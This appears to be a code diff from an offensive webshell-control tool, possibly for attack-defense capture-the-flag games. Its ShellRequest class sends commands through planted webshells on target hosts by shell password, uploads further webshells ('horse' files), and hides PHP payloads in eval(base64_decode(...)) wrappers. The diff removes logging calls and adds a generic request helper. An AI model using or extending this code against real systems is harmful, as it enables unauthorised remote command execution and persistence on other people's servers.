@@ -50,8 +50,6 @@ class ShellRequest:
         else:
             payload = "echo '*----START----*';" + payload + ";echo '*----END----*';"
 
-        Log.blue('[*] {}:{}'.format(ip, port), end=' ====> ')
-        self.pre_operate(target)
         if shell_method == 'GET':
             url_ = "http://{}:{}/{}?{}={}" if '?' not in shell_path else "http://{}:{}/{}&{}={}"
             url = url_.format(ip, port, shell_path, shell_password, payload)
@@ -84,8 +82,6 @@ class ShellRequest:
         ip, port = target['ip'], target['port']
         result, response = None, None
 
-        Log.blue('[*] {}:{}'.format(ip, port), end=' ====> ')
-        self.pre_operate(target)
         if shell_method == 'GET':
             url_ = "http://{}:{}/{}?{}={}" if '?' not in shell_path else "http://{}:{}/{}&{}={}"
             url = url_.format(ip, port, shell_path, shell_password, filepath)
@@ -104,8 +100,6 @@ class ShellRequest:
 
         if response:
             result = self.process_response(response)
-            if result == '':
-                Log.red('Request ok but no result')
         return result
 
     def upload_horse(self, target, shell, horse_name):
@@ -125,8 +119,6 @@ class ShellRequest:
         if Config.eval_base64_coding:
             payload = 'eval(base64_decode("{}"));'.format(base64.b64encode(payload.encode()).decode())
 
-        Log.blue('[*] {}:{}'.format(ip, port), end=' ====> ')
-        self.pre_operate(target)
         if shell_method == 'GET':
             url_ = "http://{}:{}/{}?{}={}" if '?' not in shell_path else "http://{}:{}/{}&{}={}"
             url = url_.format(ip, port, shell_path, shell_password, payload)
@@ -159,8 +151,6 @@ class ShellRequest:
         ip, port = target['ip'], target['port']
         payload += ';' if payload[-1] != ';' else ''
 
-        self.pre_operate(target)
-        Log.blue('[*] {}:{}'.format(ip, port), end=' ====> ')
         url = "http://{}:{}/{}".format(ip, port, shell_path)
         response = HeaderHorse.operate(url, payload)
         result = self.process_response(response)
@@ -171,3 +161,17 @@ class ShellRequest:
             except:
                 return Log.red('Request ok but eval error')
         return result
+
+    def make_request(self, target, method, path, data=None):
+        header = Config.custom_request_headers
+        url = 'http://{}:{}/{}'.format(target['ip'], target['port'], path)
+        try:
+            if method == 'GET':
+                response = self.session.get(url, headers=header, proxies=Config.proxy, timeout=2)
+            else:
+                header['Content-Type'] = 'application/x-www-form-urlencoded'
+                response = self.session.post(url, headers=header, data=data, proxies=Config.proxy, timeout=2)
+            result = self.process_response(response)
+            return result
+        except requests.Timeout:
+            Log.red('Connect failed, Timeout.')
